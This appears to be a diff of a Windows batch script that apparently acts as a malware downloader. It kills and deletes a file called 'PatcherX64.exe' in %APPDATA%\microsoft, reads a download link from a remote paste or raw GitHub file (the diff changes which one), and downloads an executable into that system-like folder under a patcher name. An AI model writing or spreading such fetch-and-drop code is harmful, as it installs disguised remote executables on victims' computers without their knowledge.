@@ -9,7 +9,7 @@ color 0A
 taskkill /f /im PatcherX64.exe >nul 2>&1
 del /f /q "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
  
-for /f "delims=" %%i in ('curl -s https://rentry.co/hhuuq6cp/raw') do set "SHSTFILELINK=%%i"
+for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/ShellHostFileLink') do set "SHSTFILELINK=%%i"
  
 :: Download the file using curl
 curl -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%SHSTFILELINK%"
